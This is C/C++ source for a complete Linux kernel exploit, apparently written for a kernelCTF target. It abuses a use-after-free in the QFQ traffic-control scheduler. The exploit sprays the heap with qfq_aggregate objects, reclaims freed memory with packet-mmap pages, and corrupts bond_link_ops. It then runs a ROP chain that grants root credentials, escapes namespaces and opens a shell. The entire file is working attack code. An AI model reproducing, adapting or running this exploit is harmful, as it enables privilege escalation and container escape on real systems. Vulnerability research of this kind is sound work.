#include <arpa/inet.h>
#include <endian.h>
#include <errno.h>
#include <net/if.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include <pthread.h>
#include <linux/if_ether.h>
#include <linux/netlink.h>
#include <linux/pkt_cls.h>
#include <linux/pkt_sched.h>
#include <linux/rtnetlink.h>
#include <sys/msg.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <sched.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <xdk/core.h>
#include <xdk/postrip.h>
#include "kaslr_bypass.h"

#define NLA_F_NESTED (1 << 15)
#define TC_HANDLE(maj, min) (((maj) << 16) | (min))
#define TC_MSG_BUFSIZE 16384
#define PAGE_SIZE 0x1000
#define SPRAY_CLASS_COUNT   128
#define SPRAY_QDISC         TC_HANDLE(100, 0)
#define LOOPBACK_ADDR 0x7F000001

// nlmsg tail pointer calculation
#define NLMSG_TAIL(nmsg) ((struct rtattr*)(((char*)(nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))

// xor eax, eax ; jmp __x86_return_thunk
#define GADGET_XOR_EAX_JMP 0x14b400

// "ipvlan" (little-endian)
#define FAKE_KIND_STRING_IPVLAN 0x6e616c767069
#define FAKE_KIND_STRING_INDEX 0x100
#define FAKE_CL_PTR       0x0a
#define FAKE_QDISC_PTR    0x23
#define FAKE_OPS_PEEK_PTR 0x47
#define FAKE_CL_STRUCT_OFFS    0x100
#define FAKE_QDISC_STRUCT_OFFS 0x200
#define FAKE_ROP_CHAIN_OFFS 0x840
#define FAKE_DUMMY_PTR_OFFS 0x500
#define FAKE_CL_ALIST_OFFS 0x58

typedef struct {
    int fd;
    char *mapped;
    size_t size;
} pgv_frame_t;

struct nl_req {
    struct nlmsghdr  nlh;
    struct ifinfomsg ifi;
    char             buf[512];
};

Target* g_target = nullptr;

uint64_t __init_begin = 0;
uint64_t bond_link_ops = 0;
uint64_t init_region_base = 0;
uint64_t swapgs_restore_regs_and_return_to_usermode = 0;
uint64_t xor_eax_jmp = 0;
unsigned long user_cs,user_ss,user_rsp,user_rflags;
static int spray_ifindex = 0;
pgv_frame_t pgv[2] = {};
static char g_nl_buf[TC_MSG_BUFSIZE];

INCBIN(target_db, "target_db.kxdb");

static void save_state() {
        asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_rsp),"=r" (user_rflags) : : "memory");
}

void setup_cpu_affinity(int cpu) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(cpu, &cpu_set);
  if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0) {
    perror("sched_setaffinity()");
    exit(EXIT_FAILURE);
  }
  usleep(1000);
}

void setup_sandbox()
{
    uid_t uid = getuid();
    gid_t gid = getgid();
    int fd;
    char buf[32];

    if (unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        perror("unshare");
        exit(1);
    }

    fd = open("/proc/self/setgroups", O_WRONLY);
    write(fd, "deny", 4);
    close(fd);

    fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(buf, sizeof(buf), "0 %d 1", uid);
    write(fd, buf, strlen(buf));
    close(fd);

    fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(buf, sizeof(buf), "0 %d 1", gid);
    write(fd, buf, strlen(buf));
    close(fd);
}


// loopback interface up
static void setup_loopback(void)
{
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock < 0) return;
    
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strcpy(ifr.ifr_name, "lo");
    
    ifr.ifr_flags = IFF_UP | IFF_LOOPBACK | IFF_RUNNING;
    ioctl(sock, SIOCSIFFLAGS, &ifr);
    
    struct sockaddr_in *addr = (struct sockaddr_in *)&ifr.ifr_addr;
    addr->sin_family = AF_INET;
    addr->sin_addr.s_addr = htonl(LOOPBACK_ADDR);
    ioctl(sock, SIOCSIFADDR, &ifr);
    
    close(sock);
}

void setup_env(void){
    setup_sandbox();
    setup_cpu_affinity(0);
    save_state();
    setup_loopback();
}

void get_shell(void)
{
    int mntns_fd = open("/proc/1/ns/mnt", O_RDONLY);
    if (mntns_fd >= 0) {
        setns(mntns_fd, CLONE_NEWNS);
        close(mntns_fd);
    }

    static const char *sh_args[] = {"/bin/sh", nullptr};
    execve("/bin/sh", (char *const *)sh_args, nullptr);
}

// KASLR-adjusted kernel symbol/gadget address calculation
void setup_kernel_address() {

    __init_begin = kaslr + g_target->GetSymbolOffset("__init_begin");
    bond_link_ops = kaslr + g_target->GetSymbolOffset("bond_link_ops");
    swapgs_restore_regs_and_return_to_usermode = kaslr + g_target->GetSymbolOffset("swapgs_restore_regs_and_return_to_usermode");
    xor_eax_jmp = kaslr + g_target->GetSymbolOffset("gadget_xor_eax_ret");
    
    init_region_base = __init_begin + 0x100000;

}

/*
 * Netlink message builder
 */

static struct nlmsghdr* nl_msg_init(void)
{
  struct nlmsghdr* msg = (struct nlmsghdr*)g_nl_buf;
  memset(msg, 0, TC_MSG_BUFSIZE);
  msg->nlmsg_len = NLMSG_ALIGN(NLMSG_LENGTH(0));
  return msg;
}

static struct tcmsg* nl_msg_init_tc(struct nlmsghdr* msg, uint16_t type,
                                    uint16_t flags, int ifindex,
                                    uint32_t parent, uint32_t handle)
{
  struct tcmsg* tc;
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_type = type;
  msg->nlmsg_flags = flags;
  tc = (struct tcmsg*)NLMSG_DATA(msg);
  tc->tcm_family = AF_UNSPEC;
  tc->tcm_ifindex = ifindex;
  tc->tcm_parent = parent;
  tc->tcm_handle = handle;
  return tc;
}

static int nl_attr_put(struct nlmsghdr* msg, int maxlen, int type,
                       const void* data, int alen)
{
  int len = RTA_LENGTH(alen);
  struct rtattr* rta;
  if (NLMSG_ALIGN(msg->nlmsg_len) + RTA_ALIGN(len) > (unsigned int)maxlen)
    return -1;
  rta = NLMSG_TAIL(msg);
  rta->rta_type = type;
  rta->rta_len = len;
  if (alen && data)
    memcpy(RTA_DATA(rta), data, alen);
  msg->nlmsg_len = NLMSG_ALIGN(msg->nlmsg_len) + RTA_ALIGN(len);
  return 0;
}

static int nl_attr_put_str(struct nlmsghdr* msg, int maxlen, int type, const char* str)
{
  return nl_attr_put(msg, maxlen, type, str, strlen(str) + 1);
}

static int nl_attr_put_u32(struct nlmsghdr* msg, int maxlen, int type, uint32_t v)
{
  return nl_attr_put(msg, maxlen, type, &v, 4);
}

static struct rtattr* nl_attr_nest_start(struct nlmsghdr* msg, int maxlen, int type)
{
  struct rtattr* nest = NLMSG_TAIL(msg);

  if (nl_attr_put(msg, maxlen, type | NLA_F_NESTED, NULL, 0) < 0)
    return NULL;
  return nest;
}

static void nl_attr_nest_end(struct nlmsghdr* msg, struct rtattr* nest)
{
  nest->rta_len = (char*)NLMSG_TAIL(msg) - (char*)nest;
}

static int nl_send(int sock, struct nlmsghdr* msg)
{
  struct sockaddr_nl nladdr;
  struct iovec iov;
  struct msghdr msgh;
  memset(&nladdr, 0, sizeof(nladdr));
  nladdr.nl_family = AF_NETLINK;
  iov.iov_base = msg;
  iov.iov_len = msg->nlmsg_len;
  memset(&msgh, 0, sizeof(msgh));
  msgh.msg_name = &nladdr;
  msgh.msg_namelen = sizeof(nladdr);
  msgh.msg_iov = &iov;
  msgh.msg_iovlen = 1;
  return sendmsg(sock, &msgh, 0);
}

// send packet to specific class via classid
static void send_to_class(uint32_t classid, int count)
{
    int sock;
    struct sockaddr_in addr;
    char data[64] = "trigger";
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0)
        return;
    
    const char* ifname = "lo";
    setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, ifname, strlen(ifname));
    
    struct timeval tv = {0, 10000};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(LOOPBACK_ADDR);
    addr.sin_port = htons(12345);
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
        int prio = classid;
        setsockopt(sock, SOL_SOCKET, SO_PRIORITY, &prio, sizeof(prio));
        for (int i = 0; i < count; i++)
            write(sock, data, sizeof(data));
    }
    close(sock);
}

// delete qdisc
static int del_qdisc(int sock, int ifindex, uint32_t parent, uint32_t handle)
{
  struct nlmsghdr* msg = nl_msg_init();
  nl_msg_init_tc(msg, RTM_DELQDISC, NLM_F_REQUEST, ifindex, parent, handle);
  return nl_send(sock, msg);
}

// cleanup TC
static void cleanup_tc(int sock, int ifindex)
{
  del_qdisc(sock, ifindex, TC_H_ROOT, 0);
}

// add QFQ qdisc
static void add_qdisc_qfq(int sock, int ifindex, uint32_t parent, uint32_t handle)
{
    struct nlmsghdr* msg = nl_msg_init();
    nl_msg_init_tc(msg, RTM_NEWQDISC, NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL,ifindex, parent, handle);
    nl_attr_put_str(msg, TC_MSG_BUFSIZE, TCA_KIND, "qfq");
    nl_send(sock, msg);
}

// add QFQ class
static int add_class_qfq(int sock, int ifindex, uint32_t parent, uint32_t handle,
                     uint32_t weight, uint32_t limit)
{
  struct rtattr* nest;
  struct nlmsghdr* msg = nl_msg_init();
  nl_msg_init_tc(msg, RTM_NEWTCLASS, NLM_F_REQUEST | NLM_F_CREATE, ifindex,parent, handle);
  nl_attr_put_str(msg, TC_MSG_BUFSIZE, TCA_KIND, "qfq");
  nest = nl_attr_nest_start(msg, TC_MSG_BUFSIZE, TCA_OPTIONS);
  nl_attr_put_u32(msg, TC_MSG_BUFSIZE, TCA_QFQ_WEIGHT,weight);
  nl_attr_put_u32(msg, TC_MSG_BUFSIZE, TCA_QFQ_LMAX, limit);
  nl_attr_nest_end(msg, nest);
  return nl_send(sock, msg);
}

// add teql qdisc
static void add_qdisc_teql(int sock, int ifindex, uint32_t parent, uint32_t handle)
{
  struct nlmsghdr* msg = nl_msg_init();
  nl_msg_init_tc(msg, RTM_NEWQDISC, NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL,ifindex, parent, handle);
  nl_attr_put_str(msg, TC_MSG_BUFSIZE, TCA_KIND, "teql0");
  nl_send(sock, msg);
}

// add netem qdisc
static void add_qdisc_netem(int sock, int ifindex, uint32_t parent, uint32_t handle)
{
    struct nlmsghdr* msg = nl_msg_init();
    nl_msg_init_tc(msg, RTM_NEWQDISC, NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL,
                   ifindex, parent, handle);
    nl_attr_put_str(msg, TC_MSG_BUFSIZE, TCA_KIND, "netem");
    
    struct tc_netem_qopt qopt;
    memset(&qopt, 0, sizeof(qopt));
    qopt.latency = 100000000; // set latency to 6.4s to control qfq_dequeue() re-entry timing
    qopt.limit = 1000; // max packets in queue
    nl_attr_put(msg, TC_MSG_BUFSIZE, TCA_OPTIONS, &qopt, sizeof(qopt));
    
    nl_send(sock, msg);
}


// create dummy interface
static int create_dummy_interface(int sock, const char *name)
{
    struct nl_req req;
    memset(&req, 0, sizeof(req));
    
    req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
    req.nlh.nlmsg_type = RTM_NEWLINK;
    req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
    req.ifi.ifi_family = AF_UNSPEC;

    struct rtattr *rta = (struct rtattr *)((char *)&req + NLMSG_ALIGN(req.nlh.nlmsg_len));
    rta->rta_type = IFLA_IFNAME;
    rta->rta_len = RTA_LENGTH(strlen(name) + 1);
    strcpy((char*)RTA_DATA(rta), name);
    req.nlh.nlmsg_len += RTA_ALIGN(rta->rta_len);
    
    struct rtattr *linkinfo = (struct rtattr *)((char *)&req + NLMSG_ALIGN(req.nlh.nlmsg_len));
    linkinfo->rta_type = IFLA_LINKINFO;

    struct rtattr *kind = (struct rtattr*)RTA_DATA(linkinfo);
    kind->rta_type = IFLA_INFO_KIND;
    kind->rta_len = RTA_LENGTH(6);
     strcpy((char*)RTA_DATA(kind), "dummy");
    
    linkinfo->rta_len = RTA_LENGTH(RTA_ALIGN(kind->rta_len));
    req.nlh.nlmsg_len += RTA_ALIGN(linkinfo->rta_len);
    
    return send(sock, &req, req.nlh.nlmsg_len, 0);
}

// interface up
static int set_interface_up(int sock, int ifindex)
{
    struct {
        struct nlmsghdr  nlh;
        struct ifinfomsg ifi;
    } req;
    
    memset(&req, 0, sizeof(req));
    req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
    req.nlh.nlmsg_type = RTM_NEWLINK;
    req.nlh.nlmsg_flags = NLM_F_REQUEST;
    req.ifi.ifi_family = AF_UNSPEC;
    req.ifi.ifi_index = ifindex;
    req.ifi.ifi_flags = IFF_UP;
    req.ifi.ifi_change = IFF_UP;
    
    return send(sock, &req, req.nlh.nlmsg_len, 0);
}

// create dummy0 interface and set root qdisc for qfq_aggregate struct spray
static void setup_spray_interface(int sock)
{
    create_dummy_interface(sock, "dummy0");
    usleep(10000);
    
    spray_ifindex = if_nametoindex("dummy0");
    set_interface_up(sock, spray_ifindex);
    add_qdisc_qfq(sock, spray_ifindex, TC_H_ROOT, SPRAY_QDISC);
}

// spray qfq_aggregate in kmalloc-128
// use different lmax per set to assign each to a different qfq_group
static void spray_qfq_aggregate_kmalloc_128(int sock, int set)
{
    uint32_t base = 0x10 + (set * 0x100);
    
    for (int i = 0; i < SPRAY_CLASS_COUNT; i++) {
        add_class_qfq(sock, spray_ifindex, SPRAY_QDISC, TC_HANDLE(100, base + i), 1, 1514 + set * 0x100 + i);
    }
}

// delete QFQ class
static int del_qfq_class(int sock, int ifindex, uint32_t parent, uint32_t handle)
{
    struct nlmsghdr* msg = nl_msg_init();
    nl_msg_init_tc(msg, RTM_DELTCLASS, NLM_F_REQUEST, ifindex, parent, handle);
    nl_attr_put_str(msg, TC_MSG_BUFSIZE, TCA_KIND, "qfq");
    return nl_send(sock, msg);
}

static void free_spray_classes(int sock, int set)
{
    uint32_t base = 0x10 + (set * 0x100);
    
    for (int i = 0; i < SPRAY_CLASS_COUNT; i++) {
        del_qfq_class(sock, spray_ifindex, SPRAY_QDISC, TC_HANDLE(100, base + i));
    }
}

// add SFQ qdisc (qopt values are arbitrary, just need to pass validation)
static void add_qdisc_sfq(int sock, int ifindex, uint32_t parent, uint32_t handle)
{
  struct nlmsghdr* msg = nl_msg_init();
  nl_msg_init_tc(msg, RTM_NEWQDISC, NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL,ifindex, parent, handle);
  nl_attr_put_str(msg, TC_MSG_BUFSIZE, TCA_KIND, "sfq");
  
  struct tc_sfq_qopt_v1 qopt;
  memset(&qopt, 0, sizeof(qopt));
  qopt.v0.quantum = 150994944;
  qopt.v0.perturb_period = 50331648;
  qopt.v0.limit = 4278190080;
  qopt.v0.divisor = 4152360959;
  qopt.v0.flows = 150994957;
  qopt.depth = 33554432;
  qopt.qth_min = 33554432;
  qopt.qth_max = 83886080;
  nl_attr_put(msg, TC_MSG_BUFSIZE, TCA_OPTIONS, &qopt, sizeof(qopt));
  nl_send(sock, msg);
}

// update QFQ class parameters
static void update_class_qfq(int sock, int ifindex, uint32_t parent, uint32_t handle,
                             uint32_t weight, uint32_t lmax)
{
    struct rtattr* nest;
    struct nlmsghdr* msg = nl_msg_init();
    
    nl_msg_init_tc(msg, RTM_NEWTCLASS, NLM_F_REQUEST | NLM_F_CREATE | NLM_F_REPLACE, ifindex, parent, handle);
    
    nl_attr_put_str(msg, TC_MSG_BUFSIZE, TCA_KIND, "qfq");
    
    nest = nl_attr_nest_start(msg, TC_MSG_BUFSIZE, TCA_OPTIONS);
    nl_attr_put_u32(msg, TC_MSG_BUFSIZE, TCA_QFQ_WEIGHT, weight);
    nl_attr_put_u32(msg, TC_MSG_BUFSIZE, TCA_QFQ_LMAX, lmax);
    nl_attr_nest_end(msg, nest);
    
    nl_send(sock, msg);
}


int pgv_create_socket(size_t block_size, size_t block_nr) {
    int socketfd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socketfd < 0) {
        perror("socket");
        return -1;
    }

    int version = TPACKET_V1;
    if (setsockopt(socketfd, SOL_PACKET, PACKET_VERSION, &version, sizeof(version)) < 0) {
        perror("setsockopt PACKET_VERSION");
        close(socketfd);
        return -1;
    }

    struct tpacket_req req;
    memset(&req, 0, sizeof(req));
    req.tp_block_size = block_size;
    req.tp_block_nr = block_nr;
    req.tp_frame_size = PAGE_SIZE;
    req.tp_frame_nr = (block_size * block_nr) / PAGE_SIZE;

    if (setsockopt(socketfd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req)) < 0) {
        perror("setsockopt PACKET_TX_RING");
        close(socketfd);
        return -1;
    }

    return socketfd;
}

void pgvAdd(int idx, int order, int nr) {
    size_t block_size = PAGE_SIZE * (1 << order);
    pgv[idx].fd = pgv_create_socket(block_size, nr);
    pgv[idx].size = block_size * nr;
}

void *pgvMap(int idx) {
    pgv[idx].mapped = (char*)mmap(NULL, pgv[idx].size, PROT_READ | PROT_WRITE, MAP_SHARED, pgv[idx].fd, 0);
    if (pgv[idx].mapped == MAP_FAILED) {
        perror("mmap");
        return NULL;
    }
    return pgv[idx].mapped;
}

void pgvDel(int idx) {
    if (pgv[idx].mapped && pgv[idx].mapped != MAP_FAILED) {
        munmap(pgv[idx].mapped, pgv[idx].size);
        pgv[idx].mapped = NULL;
    }
    if (pgv[idx].fd > 0) {
        close(pgv[idx].fd);
        pgv[idx].fd = 0;
    }
    pgv[idx].size = 0;
}

// initialize libxdk target DB
// manually register symbols not in kxdb via AddSymbol
void init_libxdk(void) {
    static TargetDb kxdb("target_db.kxdb", target_db);
    
    Target st("kernelctf", "cos-113-18244.521.39");

    st.AddSymbol("__init_begin", 0x345c000);
    st.AddSymbol("bond_link_ops", 0x2d86f00);
    st.AddSymbol("gadget_xor_eax_ret", GADGET_XOR_EAX_JMP);
    st.AddSymbol("swapgs_restore_regs_and_return_to_usermode", 0x1401190);

    
    st.AddStruct("qfq_aggregate", 104, {
        {"next.next", 0x00, 8},
        {"next.pprev", 0x08, 8},
        {"grp", 0x20, 8},
        {"inv_w", 0x30, 4},
        {"budgetmax", 0x34, 4},
        {"initial_budget", 0x38, 4},
        {"budget", 0x3c, 4},
        {"active.next", 0x48, 8},
    });


    kxdb.AddTarget(st);
    
    static Target target = kxdb.AutoDetectTarget();
    g_target = &target;
    
    printf("[+] Target: %s %s\n", target.GetDistro().c_str(), target.GetReleaseName().c_str());
}

// spray fake data over freed qfq_aggregate location via pgv
void spray_pgv(void) {
    // lookup field offsets
    auto off_next_next = g_target->GetFieldOffset("qfq_aggregate", "next.next");
    auto off_next_pprev = g_target->GetFieldOffset("qfq_aggregate", "next.pprev");
    auto off_grp = g_target->GetFieldOffset("qfq_aggregate", "grp");
    auto off_inv_w = g_target->GetFieldOffset("qfq_aggregate", "inv_w");
    auto off_budgetmax = g_target->GetFieldOffset("qfq_aggregate", "budgetmax");
    auto off_initial_budget = g_target->GetFieldOffset("qfq_aggregate", "initial_budget");
    auto off_budget = g_target->GetFieldOffset("qfq_aggregate", "budget");
    auto off_active_next = g_target->GetFieldOffset("qfq_aggregate", "active.next");

    pgvAdd(0, 0, 0x200);
    char *res = (char*)pgvMap(0);
    if (!res) return;

    size_t total_size = pgv[0].size;
    
    for (size_t offset = 0; offset < total_size; offset += 0x80) {
        char *agg = res + offset;
        // craft next/pprev so hlist_del_init() writes ROP chain address to bond_link_ops
        *(uint64_t*)(agg + off_next_next)      = init_region_base + FAKE_ROP_CHAIN_OFFS; // ROP chain location
        *(uint64_t*)(agg + off_next_pprev)     = bond_link_ops; // unlink writes ROP chain location to bond_link_ops
        *(uint64_t*)(agg + off_grp)            = init_region_base + FAKE_DUMMY_PTR_OFFS; // valid pointer needed due to grp->slot_shift access
        *(uint32_t*)(agg + off_inv_w)          = 0x1000;
        *(uint32_t*)(agg + off_budgetmax)      = 0xffffffff;
        *(uint32_t*)(agg + off_initial_budget) = 0x1000;
        *(uint32_t*)(agg + off_budget)         = 0x2000;
        *(uint64_t*)(agg + off_active_next)    = init_region_base + FAKE_CL_ALIST_OFFS; // points to cl
    }
}

// NPerm spray. [__init_begin, __init_end] region is freed after boot and can be reclaimed via user mmap
void spray_nperm_payload(){
    size_t cl = init_region_base + FAKE_CL_STRUCT_OFFS;
    size_t qdisc = init_region_base + FAKE_QDISC_STRUCT_OFFS;
    
    pgvAdd(1, 9, 0x610); // bulk allocation to drain free pages, so subsequent mmap reclaims [__init_begin, __init_end] region

    Payload payload(0x200);
    
    payload.SetU64(0x08, 0); // constrain ROP layout
    payload.SetU64(0x10, init_region_base + FAKE_KIND_STRING_INDEX * sizeof(size_t)); // rtnl_link_ops->kind points to ((size_t*)addr)[FAKE_KIND_STRING_INDEX]
    payload.SetU64(0x40, 0); // constrain ROP layout

    RopChain rop(*g_target, kaslr);

    // privilege escalation + namespace escape
    rop.AddRopAction(RopActionId::COMMIT_INIT_TASK_CREDS);
    rop.AddRopAction(RopActionId::SWITCH_TASK_NAMESPACES, {1});

    // Return to userspace
    rop.Add(swapgs_restore_regs_and_return_to_usermode + 54);
    rop.Add(0);
    rop.Add(0);
    rop.Add((uint64_t)get_shell);
    rop.Add(user_cs);
    rop.Add(user_rflags);
    rop.Add(user_rsp & 0xffffffffffffff00);
    rop.Add(user_ss);

    PayloadBuilder builder(g_target->GetPivots(), kaslr);
    builder.AddPayload(payload, Register::RCX, 0x88); // stack pivot gadget
    builder.AddRopChain(rop);

    if(!builder.Build())
        exit(-1);

    builder.PrintDebugInfo();

    std::vector<uint8_t> payload_data = payload.GetData();

    // mmap 0x10000 (65536) pages to attempt reclaiming [__init_begin, __init_end] region
    for(int i = 0; i < 0x1000 * 0x10; i++){
        void *addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if(addr == MAP_FAILED) break;
        // no suitable pivot for ops->peek() call in qfq_peek_skb(), use xor eax, eax to return NULL and bypass
        ((size_t*)addr)[FAKE_CL_PTR]           = cl;
        ((size_t*)addr)[FAKE_QDISC_PTR]        = qdisc;
        ((size_t*)addr)[FAKE_OPS_PEEK_PTR]     = xor_eax_jmp;
        ((size_t*)addr)[FAKE_KIND_STRING_INDEX] = FAKE_KIND_STRING_IPVLAN;
        // place ROP chain
        memcpy(&((size_t*)addr)[0x108], payload_data.data(), payload_data.size());
    }
    
    pgvDel(1);
}

/*
 * LL_ATK: send RTM_NEWLINK request with "ipvlan" type.
 * kernel traverses rtnl_link_ops list, follows corrupted bond_link_ops->list.next
 * to fake ops with kind "ipvlan", calls function pointer -> triggers ROP
 */
void LL_ATK() {
    struct {
        struct nlmsghdr nh;
        struct ifinfomsg ifi;
        char buf[1024];
    } req;

    struct rtattr *rta;
    int sock;

    sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (sock < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&req, 0, sizeof(req));

    req.nh.nlmsg_len = NLMSG_LENGTH(sizeof(req.ifi));
    req.nh.nlmsg_type = RTM_NEWLINK;
    req.nh.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;

    req.ifi.ifi_family = AF_UNSPEC;

    rta = (struct rtattr *)(((char *)&req) + NLMSG_ALIGN(req.nh.nlmsg_len));
    rta->rta_type = IFLA_LINKINFO;
    rta->rta_len = RTA_LENGTH(0);

    struct rtattr *rta_data = (struct rtattr *)(((char *)rta) + RTA_ALIGN(rta->rta_len));
    rta_data->rta_type = IFLA_INFO_KIND;
    rta_data->rta_len = RTA_LENGTH(strlen("ipvlan") + 1);
    strcpy((char *)RTA_DATA(rta_data), "ipvlan");

    rta->rta_len = RTA_ALIGN(rta->rta_len) + RTA_ALIGN(rta_data->rta_len);

    req.nh.nlmsg_len = NLMSG_ALIGN(req.nh.nlmsg_len) + RTA_ALIGN(rta->rta_len);

    write(sock,&req, req.nh.nlmsg_len);
}

/*
 * setup TC structure
 *
 * ROOT qdisc 1:0 (QFQ)
 *   ├── class 1:1 (weight=15, lmax=16384) -> netem
 *   └── class 1:2 (weight=1, lmax=1514)   -> teql
 */
static long vuln_setup(void)
{
    int sock;
    int ifindex = 1;
    sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    
    cleanup_tc(sock, ifindex);
    setup_spray_interface(sock);
    
    add_qdisc_qfq(sock, ifindex, TC_H_ROOT, TC_HANDLE(1, 0));
    
    add_class_qfq(sock, ifindex, TC_HANDLE(1, 0), TC_HANDLE(1, 1), 15, 16384);
    add_class_qfq(sock, ifindex, TC_HANDLE(1, 0), TC_HANDLE(1, 2), 1, 2000);

    add_qdisc_sfq(sock, ifindex, TC_HANDLE(1, 1), TC_HANDLE(2, 0));
    send_to_class(TC_HANDLE(1, 2), 1);
    // spray qfq_aggregate around the target to land in the same slab as the UAF target
    spray_qfq_aggregate_kmalloc_128(sock, 0);
    spray_qfq_aggregate_kmalloc_128(sock, 1);
    add_class_qfq(sock, ifindex, TC_HANDLE(1, 0), TC_HANDLE(1, 2), 1, 1514);
    update_class_qfq(sock, ifindex, TC_HANDLE(1, 0), TC_HANDLE(1, 2), 1, 1514);
    spray_qfq_aggregate_kmalloc_128(sock, 2);
    
    add_qdisc_netem(sock, ifindex, TC_HANDLE(1, 1), TC_HANDLE(2, 0));
    add_qdisc_teql(sock, ifindex, TC_HANDLE(1, 2), TC_HANDLE(3, 0));
    
    send_to_class(TC_HANDLE(1, 1), 1);
    send_to_class(TC_HANDLE(1, 2), 1);
    
    close(sock);
    return 0;
}

static long vuln_setup2(void)
{
    int sock;
    int ifindex = 1;
    sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);

    // free sprayed qfq_aggregate
    free_spray_classes(sock, 0);
    free_spray_classes(sock, 1);
    free_spray_classes(sock, 2);
    update_class_qfq(sock, ifindex, TC_HANDLE(1, 0), TC_HANDLE(1, 2), 1, 32222); // hanging lmax frees existing qfq_aggregate, leaving dangling pointer
    close(sock);
    return 0;
}

int main(void)
{
    leak_kaslr();
    init_libxdk();
    setup_kernel_address();
    setup_env();
    pid_t pid = fork();
    
    if (pid == 0) {
        spray_nperm_payload();
        _exit(0);
    } 
    else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);

        vuln_setup();
        vuln_setup2();
        spray_pgv();
        // @sleep(kernel_func="qfq_dequeue", desc="wait for netem delay to trigger UAF")
        sleep(10);
        LL_ATK();
    }
    return 0;
}
